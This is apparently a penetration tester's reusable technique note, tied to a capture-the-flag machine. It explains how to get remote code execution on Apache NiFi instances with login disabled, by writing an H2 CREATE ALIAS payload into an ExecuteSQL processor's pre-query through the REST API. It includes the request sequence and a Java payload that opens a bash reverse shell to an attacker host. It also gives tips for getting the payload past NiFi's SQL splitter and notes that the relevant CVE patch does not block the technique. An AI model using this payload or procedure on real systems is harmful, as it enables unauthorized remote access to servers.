# Apache NiFi Unauthenticated-Write RCE via ExecuteSQL + H2 CREATE ALIAS

Generic technique for any Apache NiFi deployment with `supportsLogin: false`
(`GET /nifi-api/access/config`) — when login is disabled, the anonymous
identity gets NiFi's *default* access policy, and on a lot of real-world and
lab deployments that default is full read **and** write on every REST
resource, not just read. This is a deployment/config choice, not a NiFi code
bug — check `/nifi-api/access/config` on any NiFi instance before assuming
you need credentials.

## Precondition chain

1. `/nifi-api/access/config` → `supportsLogin: false` — confirms anonymous
   write access.
2. Any flow with a processor wired to a JDBC-based controller service
   (`DBCPConnectionPool`/`HikariCPConnectionPool`) pointed at an **H2**
   database (`jdbc:h2:...` — check
   `/nifi-api/flow/process-groups/{id}/controller-services`). H2 (any
   recent version) supports `CREATE ALIAS <name> AS $$ <java source> $$`,
   which compiles and runs arbitrary Java inside the JVM that opened the
   connection — i.e. the NiFi process itself.
3. An `ExecuteSQL` (or any SQL-executing) processor attached to that
   controller service. `ExecuteSQL` exposes a `sql-pre-query` property
   ("run setup SQL before the main query, in the same session") that takes
   arbitrary SQL text and is not gated by anything beyond normal
   processor-property write access.

If all three hold, this is not a NiFi CVE — it's the intersection of two
legitimate features (H2's Java-alias compiler + NiFi's Property write API)
exposed to an identity with no authentication.

## Exploit shape

1. `GET /nifi-api/flow/process-groups/root` to find the target processor's
   id, type, and current `revision.version`.
2. `PUT /nifi-api/processors/{id}` with a body setting `sql-pre-query` to a
   payload that both creates and calls the alias in **one** batch:
   ```
   CREATE ALIAS IF NOT EXISTS PWN AS $$
   String pwn() throws java.io.IOException {
     Runtime.getRuntime().exec(new String[]{"bash","-c",
       "bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1"});
     return "ok";
   }
   $$ ; CALL PWN()
   ```
   `revision.version` in the request body must match the value the last GET
   returned, and the response's new `revision.version` is what the next
   request (starting the processor) must use.
3. `PUT /nifi-api/processors/{id}/run-status` with `{"state":"RUNNING"}` to
   fire it, catch the shell, then immediately `PUT` again with
   `{"state":"STOPPED"}` — a `TIMER_DRIVEN` processor with a short/`0 sec`
   scheduling period free-runs continuously once started and will keep
   spawning new shells (and hammering disk/CPU) if left running.

## Two gotchas worth knowing before debugging blind

- **Don't split `CREATE ALIAS`/`CALL` across two separate SQL properties**
  (e.g. pre-query for the alias, main query for the call). Each property is
  its own separate SQL *session* context as far as the alias's visibility
  is concerned in practice — the alias creation reports success but the
  later `CALL` fails with `Function "X" not found`. Put both statements in
  the **same** property, same execution phase.
- **A bare `;` inside the H2 `$$ ... $$` dollar-quoted Java source block
  gets treated as a SQL statement separator by NiFi's own pre-query
  splitter** — it doesn't understand H2's quoting rules, so any `;`
  terminating a Java statement inside the alias body truncates the
  `CREATE ALIAS` before it ever reaches H2. Escape every such `;` as `\;`
  in the request payload; NiFi/the request path un-escapes it back to a
  literal `;` before H2 parses the source, so the compiled Java comes out
  correct.

## Why the closest matching CVE (2023-34468) doesn't actually cover this

CVE-2023-34468 patches `DBCPConnectionPool`/`HikariCPConnectionPool`'s
"Database Connection URL" property with a validator that rejects any new
value starting with `jdbc:h2` (added in NiFi 1.22.0,
`ConnectionUrlValidator`). That closes off *pointing a new controller
service at an attacker-supplied H2 URL* (e.g. one carrying `INIT=`). It says
nothing about `sql-pre-query`/`SQL select query` on `ExecuteSQL`, which
accept arbitrary SQL by design and are never routed through
`ConnectionUrlValidator` at all. If the H2 controller service is
pre-provisioned by the application (not attacker-supplied), the technique
above works identically on a patched 1.22.0+ install — the real fix is
disabling anonymous write, not upgrading NiFi.

## Seen on
[[Helix#Foothold|Helix]] — foothold RCE landing as the `nifi` service
account (uid 998), chained from an unauthenticated `flow.helix.htb` NiFi
1.21.0-RC2 instance with an `operator`-owned H2 `MaintenanceDB` service
already wired to an `ExecuteSQL` processor.
